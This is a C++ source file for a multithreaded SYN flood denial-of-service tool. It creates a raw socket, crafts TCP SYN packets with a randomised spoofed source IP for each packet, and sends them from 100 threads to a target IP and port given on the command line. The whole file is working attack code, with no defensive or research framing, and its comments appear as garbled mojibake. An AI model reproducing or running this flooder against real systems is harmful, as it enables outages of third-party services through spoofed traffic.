#include "DDOS.h"


DOS::DOS()
{
	this->m_threadNum = 100;
	this->m_thread = new pthread_t[this->m_threadNum];
	bzero(this->m_thread, this->m_threadNum * sizeof(pthread_t));
}
DOS::~DOS()
{
	if (this->m_thread)
	{
		delete[] this->m_thread;
		this->m_thread = NULL;
	}
}

int DOS::closeSocket()
{
	return close(this->m_socket);
}

// �źŴ�����,�����˳�����alive
void DOS::sig_int(int alive)
{
	//ctrl + c
	DOS::getInstance()->m_alive = 0;
}

DOS *DOS::getInstance()
{
	static DOS dos;
	return &dos;
}

void DOS::judge_argc(int argc)
{
	if (argc < 3)
	{
		printf("usage: syn ==== <IPaddress>===== <Port>\n");
		exit(1);
	}
}

void DOS::initDos(const char *IP, const int Port)
{
	if (IP == NULL)
	{
		printf("please input IP");
		return;
	}
	if (Port < 0 || Port >= 65535)
	{
		printf("Port error\n");
		return;
	}
	strncpy(this->m_dest_IP, IP, strlen(IP));
	this->m_dest_Port = Port;

	bzero(&this->m_addr, sizeof(this->m_addr));

	this->m_addr.sin_family = AF_INET;
	this->m_addr.sin_port = htons(this->m_dest_Port);


	if (inet_addr(this->m_dest_IP) == INADDR_NONE)
	{
		// ΪDNS��ַ����ѯ��ת����IP��ַ
		this->m_hostent = gethostbyname(this->m_dest_IP);
		if (this->m_hostent == NULL)
		{
			perror("gethostbyname() \n");
			exit(1);
		}
		this->m_addr.sin_addr = *((struct in_addr*)(this->m_hostent->h_addr));
		strncpy(this->m_dest_IP, inet_ntoa(this->m_addr.sin_addr), 16);
	}
	else
	{
		this->m_addr.sin_addr.s_addr = inet_addr(this->m_dest_IP);
	}

	signal(SIGINT, FLOOD->sig_int);

	FLOOD->createSocket();
	FLOOD->setPower();


	printf("init Dos\n");
	printf("dest ip %s\n", this->m_dest_IP);
	printf("dest port %d\n", this->m_dest_Port);
}

void DOS::initDos(const char *IP, const char *Port)
{
	if (IP == NULL || Port == NULL)
	{
		printf("please input IP");
		return;
	}
	if (atoi(Port) < 0 || atoi(Port) >= 65535)
	{
		printf("Port error\n");
		return;
	}
	strncpy(this->m_dest_IP, IP, strlen(IP));
	this->m_dest_Port = atoi(Port);

	bzero(&this->m_addr, sizeof(this->m_addr));

	this->m_addr.sin_family = AF_INET;
	this->m_addr.sin_port = htons(this->m_dest_Port);


	if (inet_addr(this->m_dest_IP) == INADDR_NONE)
	{
		// ΪDNS��ַ����ѯ��ת����IP��ַ
		this->m_hostent = gethostbyname(this->m_dest_IP);
		if (this->m_hostent == NULL)
		{
			perror("gethostbyname() \n");
			exit(1);
		}
		this->m_addr.sin_addr = *((struct in_addr*)(this->m_hostent->h_addr));
		strncpy(this->m_dest_IP, inet_ntoa(this->m_addr.sin_addr), 16);
	}
	else
	{
		this->m_addr.sin_addr.s_addr = inet_addr(this->m_dest_IP);
	}

	signal(SIGINT, FLOOD->sig_int);

	FLOOD->createSocket();
	FLOOD->setPower();


	printf("init Dos\n");
	printf("dest ip %s\n", this->m_dest_IP);
	printf("dest port %d\n", this->m_dest_Port);
}

void DOS::init_header(struct ip *ip, struct tcphdr *tcp, struct pseudohdr *pseudoheader)
{
	int len = sizeof(struct ip) + sizeof(struct tcphdr);
	// IPͷ�����ݳ�ʼ��
	ip->hl = (4 << 4 | sizeof(struct ip) / sizeof(unsigned int));
	ip->tos = 0;
	ip->total_len = htons(len);
	ip->id = 1;
	ip->frag_and_flags = 0x40;
	ip->ttl = 255;
	ip->proto = IPPROTO_TCP;
	ip->checksum = 0;
	ip->sourceIP = 0;
	ip->destIP = inet_addr(this->m_dest_IP);

	// TCPͷ�����ݳ�ʼ��
	tcp->sport = htons(rand() % 16383 + 49152);
	tcp->dport = htons(this->m_dest_Port);
	tcp->seq = htonl(rand() % 90000000 + 2345);
	tcp->ack = 0;
	tcp->lenres = (sizeof(struct tcphdr) / 4 << 4 | 0);
	tcp->flag = 0x02;
	tcp->win = htons(2048);
	tcp->sum = 0;
	tcp->urp = 0;

	//TCPαͷ��
	pseudoheader->zero = 0;
	pseudoheader->protocol = IPPROTO_TCP;
	pseudoheader->length = htons(sizeof(struct tcphdr));
	pseudoheader->daddr = inet_addr(this->m_dest_IP);
	srand((unsigned)time(NULL));
}

unsigned short inline DOS::checksum(unsigned short *buffer, unsigned short size)
{
	unsigned long cksum = 0;
	while (size > 1)
	{
		cksum += *buffer++;
		size -= sizeof(unsigned short);
	}
	if (size)
	{
		cksum += *(unsigned char *)buffer;
	}
	cksum = (cksum >> 16) + (cksum & 0xffff);
	cksum += (cksum >> 16);
	return((unsigned short)(~cksum));
}

void DOS::createSocket()
{
	// ����ԭʼsocket 
	//IPPROTO_RAW
	//sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
	this->m_socket = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
	if (this->m_socket < 0)
	{
		perror("socket() \n");
		exit(1);
	}
	int on = 1;
	// ����IPѡ�� 
	if (setsockopt(this->m_socket, IPPROTO_IP, IP_HDRINCL, (char *)&on, sizeof(on)) < 0)
	{
		perror("setsockopt() \n");
		exit(1);
	}
}

int DOS::setPower()
{
	return setuid(getpid());
}

void DOS::setThread(int thread)
{
	this->m_threadNum = thread;
}

void *DOS::sendFlood(void *addr)
{
	char buf[100], sendbuf[100];
	int len;
	struct ip ip;			//IPͷ��
	struct tcphdr tcp;		//TCPͷ��
	struct pseudohdr pseudoheader;	//TCPαͷ��

	len = sizeof(struct ip) + sizeof(struct tcphdr);

	/* ��ʼ��ͷ����Ϣ */
	FLOOD->init_header(&ip, &tcp, &pseudoheader);

	/* ���ڻ״̬ʱ��������SYN�� */
	while (FLOOD->m_alive)
	{
		FLOOD->m_sendPackageNum++;
		ip.sourceIP = rand();
		//����IPУ���
		bzero(buf, sizeof(buf));
		memcpy(buf, &ip, sizeof(struct ip));
		ip.checksum = FLOOD->checksum((u_short *)buf, sizeof(struct ip));
		pseudoheader.saddr = ip.sourceIP;
		//����TCPУ���
		bzero(buf, sizeof(buf));
		memcpy(buf, &pseudoheader, sizeof(pseudoheader));
		memcpy(buf + sizeof(pseudoheader), &tcp, sizeof(struct tcphdr));
		tcp.sum = FLOOD->checksum((u_short *)buf, sizeof(pseudoheader) + sizeof(struct tcphdr));

		bzero(sendbuf, sizeof(sendbuf));
		memcpy(sendbuf, &ip, sizeof(struct ip));
		memcpy(sendbuf + sizeof(struct ip), &tcp, sizeof(struct tcphdr));
		int sendLen = sendto(FLOOD->m_socket, sendbuf, len, 0, (struct sockaddr *) addr, sizeof(struct sockaddr));
		if (sendLen < 0)
		{
			perror("sendto() \n");
			pthread_exit(NULL);
		}
		printf("%s", "\033[1H\033[2J");
		printf("Send Package Number = %d \n", FLOOD->m_sendPackageNum);
	}
}

void DOS::joinThread()
{
	int error = -1;
	for (int i = 0; i < this->m_threadNum; i++)
	{
		error = pthread_join(this->m_thread[i], NULL);
		if (error != 0)
		{
			perror("pthread_join Error \n");
			exit(1);
		}
	}
}

void DOS::run()
{
	int error = -1;
	for (int i = 0; i < this->m_threadNum; i++)
	{
		error = pthread_create(&this->m_thread[i], NULL, FLOOD->sendFlood, &this->m_addr);
		if (error != 0)
		{
			perror("pthread_create() \n");
			exit(1);
		}
	}
}